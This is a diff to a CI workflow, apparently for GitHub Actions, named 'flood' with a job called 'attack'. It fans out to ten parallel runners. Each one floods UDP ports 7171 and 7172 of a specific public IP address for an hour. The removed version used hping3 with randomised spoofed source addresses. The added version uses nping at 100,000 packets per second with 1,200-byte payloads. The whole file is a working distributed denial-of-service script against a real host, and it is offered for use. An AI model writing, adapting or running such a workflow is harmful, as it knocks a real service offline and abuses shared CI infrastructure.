@@ -1,6 +1,7 @@
 name: flood
 on:
   workflow_dispatch:
+
 jobs:
   attack:
     runs-on: ubuntu-latest
@@ -8,8 +9,10 @@ jobs:
       matrix:
         runner: [1,2,3,4,5,6,7,8,9,10]
     steps:
-    - run: |
-        sudo apt-get update && sudo apt-get install -y hping3
-        hping3 --flood --udp -p 7171 --rand-source 34.151.221.105 &
-        hping3 --flood --udp -p 7172 --rand-source 34.151.221.105 &
-        sleep 3600
+      - name: Install nping
+        run: sudo apt-get update -qq && sudo apt-get install -y nmap
+      - name: Run flood
+        run: |
+          nping --udp -p 7171 --data-length 1200 --rate 100000 34.151.221.105 &
+          nping --udp -p 7172 --data-length 1200 --rate 100000 34.151.221.105 &
+          sleep 3600
